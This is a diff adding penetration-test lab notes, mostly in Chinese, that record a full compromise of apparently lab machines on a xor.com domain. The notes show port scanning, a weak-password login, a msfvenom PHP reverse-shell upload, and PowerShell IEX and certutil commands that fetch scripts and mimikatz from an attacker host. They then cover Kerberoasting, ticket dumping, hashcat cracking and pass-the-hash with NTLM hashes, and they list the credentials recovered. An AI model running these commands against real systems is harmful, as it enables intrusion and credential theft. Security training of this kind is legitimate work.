@@ -1,0 +1,63 @@
+nmap -sV -sC -Pn 10.11.1.123 > nmap.txt
+
+gobuster dir  -u http://xor-app59.xor.com/books -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobusterbooks.txt
+
+My Business - Period: | 5.2.3 (Bizuno Library 3.1.7) en_US-No ISO | Copyright ©2021 PhreeSoft™
+
+
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/GetUserSPNs.ps1')
+
+
+
+
+
+1.掃描端口發現80port直接網頁打開及gobuster掃描
+2.發現books有登入頁面,忘記密碼的頁面測試出admin@xor.com帳號
+3.使用弱密碼admin登入後可上傳文件
+4.msfvenom生成惡意png檔案,在後台上傳revershe.php
+5.在指定網址打開php才能執行code,不可直接view page(打開往只在46645.py)
+6.本地起80port,受害機執行指令,請求執行GetUserSPNs.ps1查看ServiceprincipalName及取得xor-app23.xor.com
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/GetUserSPNs.ps1')
+7.powershell添加System.IdentityModel方法
+powershell Add-Type -AssemblyName System.IdentityModel
+8.根據SPN查找可以看到這服務的service Ticket
+powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"
+9.下載mimikatz.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz_trunk.exe
+10.使用mimikat將service ticket dump出來
+kerberos::list /export
+11.使用widnows查找指令,找到上傳的php路徑,在同路徑執行mimikatz,在browser把結果ticket都載回本地
+for /r xampp %i in (*webshell*) do @echo %i
+12.將ticket轉成hashcat格式,在用hastcat破解 （只有MSSQLvc這個key可爆破）
+hashcat -m 13100 kirbihash  /usr/share/wordlists/rockyou.txt
+14.取得密碼是shantewhite
+15.net user /domain 查找到用戶是sqlserver
+16.sqlserver\xor.com shantewhite登入10.11.1.121
+17.下載mimikatz_trunk到受害機器上(121)
+certutil.exe -urlcache -split -f http://192.168.119.134/mimikatz_trunk.zip
+18.使用administrator執行powershell打開mimikatz.exe
+19.確認是否有提權權限
+privilege::debug
+20.token::elevate
+21.lsadump::sam
+22.查看登入者的訊息,發現daisy/XorPasswordIsDead17
+sekurlsa::logonpasswords
+sekurlsa::tickets
+23.123上可查看到dc01發現ip是10.11.1.120,可以猜測120-123內有服務器,可直接嘗試
+24.登入到122後上傳mimikatz_trunk後dump帳密發現david/dsfdf34534tdfGDFG5rdgr
+24.登入到120後上傳mimikatz_trunk後dump帳密發現Administrator/foidf89734tedsFG3
+
+
+
+
+pth-winexe -U WDAGUtilityAccount%aad3b435b51404eeaad3b435b51404ee:8ae51432331c115e884798a9584b1969 //10.11.1.121 cmd
+
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:3fee04b01f59a1001a366a7681e95699 //10.11.1.123 cmd
+
+sekurlsa::logonpasswords
+sekurlsa::tickets
+
+如果mimikatz遇到這就要使用mimikatz_trunk
+ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
